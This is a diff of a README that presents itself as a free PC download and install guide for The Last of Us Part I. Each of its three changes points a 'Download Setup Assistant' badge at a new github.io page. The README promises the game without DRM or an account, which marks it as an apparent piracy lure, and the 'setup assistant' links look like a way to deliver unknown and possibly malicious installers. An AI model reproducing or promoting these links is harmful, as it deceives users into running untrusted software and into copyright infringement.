@@ -1,6 +1,6 @@
 # The Last of Us Part I — Free Download & Full Installation Guide
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/tlou1)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://the-last-of-us-part-1-pc-download.github.io/.github)
 
 ## 🧟 About the Game
 
@@ -22,7 +22,7 @@ With this guide, you can **install The Last of Us Part 1 on PC for free**, compl
 
 ---
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/tlou1)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://the-last-of-us-part-1-pc-download.github.io/.github)
 
 ---
 
@@ -44,7 +44,7 @@ With this guide, you can **install The Last of Us Part 1 on PC for free**, compl
 - 🧩 No launcher, no online account, no DRM  
 - 🖥 Optimized for modern PC systems with full controller support
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/tlou1)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://the-last-of-us-part-1-pc-download.github.io/.github)
 
 ---
 
